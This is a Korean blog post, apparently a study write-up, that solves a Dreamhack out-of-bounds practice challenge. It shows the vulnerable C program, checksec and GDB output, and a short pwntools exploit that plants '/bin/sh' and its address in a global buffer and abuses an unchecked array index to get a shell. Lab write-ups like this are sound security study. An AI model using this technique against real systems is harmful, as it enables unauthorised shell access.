---
layout: post
title: <System Hacking> 26. Out of Bound
date: 2026-05-12 10:31:23 +0900
category: System_Hacking
comments: true
---

## Introduction

사실 OOB 취약점은 개념 자체는 단순해서 예전에 따로 포스팅을 안했었다. 그래도 복습의 차원에서, 개념보다는 예제 위주로 설명을 진행해보려고 한다.

## OOB Example

Dreamhack의 OOB 예제이다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```

### Check security

우선, `checksec`을 통해 보호 기법을 확인하자.

```bash
$ checksec out_of_bound
[*] '/home/conan/Study/Dreamhack/out_of_bound'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

No PIE이기 때문에, CODE, DATA, BSS 영역의 주소가 항상 동일한 주소에 로드됨을 알 수 있다.

### Exploit Design

1. `system(command[idx])`에서 `command[idx]`에 `/bin/sh`문자열의 주소가 들어가준다면 아주 딱 좋은 익스플로잇 코드가 될 것 같다고 직감할 수 있다.
2. `scanf("%d", &idx)`를 통해 `command[idx]`에서 OOB 취약점을 유발시킴으로써, `command` 문자열 배열 근처의 `name` 배열의 값을 불러오기 딱 좋아보인다.
3. 32비트 바이너리인 만큼 8바이트가 아닌 4바이트씩 연산해야 함을 주의하자.

### .data, .bss의 개념

여기서 GDB를 통해 디버깅을 하다보면, '`command` 전에 `name`이 붙어서 존재하겠지?'라는 내 예상과는 다른 결과가 나온다.

```bash
pwndbg> i var name
All variables matching regular expression "name":
...
Non-debugging symbols:
0x0804a0ac  name
0xf7fee380  audit_iface_names
0xf7ffd9cc  newname
0xf7fb1814  name
0xf7fb42b4  old_file_name

pwndbg> i var command
All variables matching regular expression "command":

Non-debugging symbols:
0x0804a060  command
```

결과를 보면 `command`보다 `name`이 **무려 0x4c 뒤에 존재**한다. 이유를 분석해보니, 두 변수의 영역이 애초에 다르다.

```c
char name[16];          // 초기화 안됨 → .bss
char *command[10] = {...}; // 초기화됨 → .data
```

되게 당연한 이유지만, 놓치기 쉬운 부분이라 잘 기억해두려고한다.

### system()의 인자는 주소로!

처음에 익스플로잇을 시도할 때는 문자열 `/bin/sh`를 인자로 전달했는데, 그러면 당연히 결과가 의도한 대로 안나온다. **`system`함수의 인자는 문자열의 주소**로 전달해야한다. 그래서 방법을 찾고자 하니, `name[16]`의 길이가 눈에 띈다.

```
name[0~7]   = "/bin/sh\x00"
name[8~11]  = 0x0804a0ac (주소)
```

이렇게 넣는다면 공간이 충분히 들어갈 것으로 보인다. 이후, `system`의 인자로 저 '주소'를 전달하면 성공적으로 쉘 획득이 가능해보인다.

### 최종 코드

```python
from pwn import *

p = process('./out_of_bound')

payload = b'/bin/sh\x00' + p32(0x0804a0ac)

p.sendafter('Admin name: ', payload)

p.sendlineafter('What do you want?: ', b'21')

p.interactive()
```

그동안 작성했던 익스플로잇 코드중에 가장 짧은 것 같다.


